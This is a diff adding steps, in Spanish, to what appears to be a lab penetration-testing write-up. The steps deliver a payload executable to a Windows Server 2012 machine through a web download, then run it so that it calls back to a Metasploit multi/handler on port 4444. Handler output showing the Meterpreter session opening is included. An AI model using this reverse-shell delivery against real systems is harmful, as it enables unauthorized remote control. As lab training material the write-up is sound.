@@ -95,3 +95,23 @@ set LPORT 4444
 exploit
 ```
 ![handler](handler-configurado.png)
+
+
+### Paso 3.3: Transferencia del Payload mediante Vector Web
+
+Para simular un vector de distribución realista enfocado en la interacción del usuario, se utiliza el navegador Internet Explorer en el entorno comprometido de **Windows Server 2012**. Accedemos de forma directa a la dirección IP del servidor web de auditoría (`http://10.10.10.5:80/`) para interactuar con el directorio indexado, descargando el archivo ejecutable `agente64.exe` y almacenándolo localmente en la ruta del escritorio.
+
+---
+
+### Paso 3.4: Ejecución del Payload y Obtención de la Sesión Meterpreter
+
+Una vez completada la descarga web, se procede a la ejecución del binario `agente64.exe` en la máquina víctima mediante doble clic. El payload establece la llamada reversa de forma inmediata hacia el puerto `4444` de la máquina de control. El escuchador `multi/handler` intercepta la petición, realiza el intercambio de etapas (*staging*) en memoria y nos concede acceso interactivo completo mediante una consola de Meterpreter.
+
+```bash
+[*] Started reverse TCP handler on 10.10.10.5:4444
+[*] Sending stage (200116 bytes) to 10.10.10.20
+[*] Meterpreter session 1 opened (10.10.10.5:4444 -> 10.10.10.20:49152)
+
+meterpreter >
+```
+![meterpreter](sesion-meterpreter.png)
